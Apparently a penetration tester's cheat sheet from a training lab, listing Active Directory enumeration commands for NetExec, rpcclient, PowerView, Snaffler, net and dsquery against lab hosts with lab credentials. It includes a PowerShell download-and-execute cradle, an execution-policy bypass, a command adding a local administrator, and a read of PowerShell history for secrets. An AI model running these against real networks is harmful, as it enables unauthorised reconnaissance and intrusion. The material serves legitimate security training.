## From Linux
#### NetExec - Domain User Enumeratiom  
```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
#### NetExec - Domain Group Enumeration
```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
#### NetExec - Logged On Users
```shell
sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

---
#### Share Enumeration - Domain Controller
```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
#### Spider_plus
```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
*!* When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`. We can then dig further to find sensitive files.

---
#### SMBMap To Check Access
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
#### Recursive List Of All Directories
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
*!!* `--dir-only` is used to list only directories.

---
#### rpcclient Enumeration
A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects.
SID of User = SID of Domain + RID of User
#### Enumdomusers
```shell-session
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
...
```
#### RPCClient User Enumeration By RID
```shell
rpcclient $> queryuser 0x457
```

---
#### Windapsearch - Domain Admins
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
#### Windapsearch - Privileged Users
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

---
## Bloodhound.py
[[Bloodhound]]

---

## From Windows
#### Load ActiveDirectory Module
The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.
```powershell
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
```
#### Get Domain Info
```powershell
PS C:\htb> Get-ADDomain
```
#### Get-ADUser
We will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack.
```powershell
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
#### Checking For Trust Relationships
```powershell
PS C:\htb> Get-ADTrust -Filter *
```
#### Group Enumeration
```powershell
PS C:\htb> Get-ADGroup -Filter * | select name
```
#### Detailed Group Info
```powershell
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```
#### Group Membership
```powershell
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```

---
## Powerview
#### Domain User Information
The [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) function will provide us with information on all users or specific users we specify.
```powershell
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
#### Recursive Group Membership
We can use the [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/) function to retrieve group-specific information. Adding the `-Recurse` switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups.
```powershell
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
#### Trust Enumeration
```powershell
PS C:\htb> Get-DomainTrustMapping
```
#### Testing for Local Admin Access
```powershell
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01.
#### Finding Users With SPN Set
 We can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.
```powershell
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

See: https://powersploit.readthedocs.io/en/latest/Recon/

---
## SharpView
We can type a method name with `-Help` to get an argument list.
```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help
```

Information about forend user:
```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```

---
## Snaffler

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

---
## Living Of The Land
#### Basic Enumeration Command
```powershell
hostname
systeminfo
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set                #CMD
echo %USERDOMAIN%  #CMD
echo %logonserver% #CMD
```
#### Powershell 
```powershell
Get-Module                                # List all module available
Get-ExecutionPolicy -List                 # Will print execution policy settings
Set-ExecutionPolicy Bypass -Scope Process # Modify execution policy for this session
Get-ChildItem Env: | ft Key,Value         # Return environment values

Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# With this string, we can get the specified user's PowerShell history

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" 
# This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
```
#### Checking Defense
Firewall:
```powershell
PS C:\htb> netsh advfirewall show allprofiles
```

Windows Defender:
```cmd
C:\htb> sc query windefend
```

```powershell
PS C:\htb> Get-MpComputerStatus
```
#### Who is logged on ?
```powershell
qwinsta
```
#### Network Info
```powershell
arp -a          # Arp Table
ipconfig /all   
route print     # Routing Table
```
#### WMI
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn # Hotfixes
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
# Display basic host info

wmic process list /format:list # Listing of all processes
wmic ntdomain list /format:list # Info about Domain and DC
wmic useraccount list /format:list # Info about local acount and domain account that have logged on the device

wmic group list /format:list # Info about local groups
wmic sysaccount list /format:list # Dumps information about any system accounts that are being used as service accounts

wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
# Bunch of Domain infos
```
#### Net
```powershell
net accounts         # Info about password requirements
net accounts /domain # Password and lockout policy

net group /domain    # Info about domain groups
net group "Domain Admins" /domain # List users with DA Privs
net group "domain computers" /domain # List PCs connected to the domain
net group "Domain Controllers" /domain # List PC account of domains controllers
net group <group_name> /domain # List users that belongs to the group
net group /domain # List domain groups 

net localgroup # List all available groups
net localgroup administrators /domain # List users that belongs to the administrators group inside the domain
net localgroup administrators # Info about administrators groups
net localgroup administrators [username] /add # Add user to administrators

net share # Check current share

net user [account] /domain # Info about account within the domain
net user %username% # Info about the current user

net use x: \computer\share # Mount share locally

net view # List of computer
net view /all /domain[:domainname] 
net view \computer /ALL # List shares of a computer
net view /domain # List of PCs of the domain
```
#### Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects.
All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context.
```powershell
# User search
dsquery user

# Computer search
dsquery computer

# Wildcard search
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

# User with specific attributes set (PASSWD_NOTREQD)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```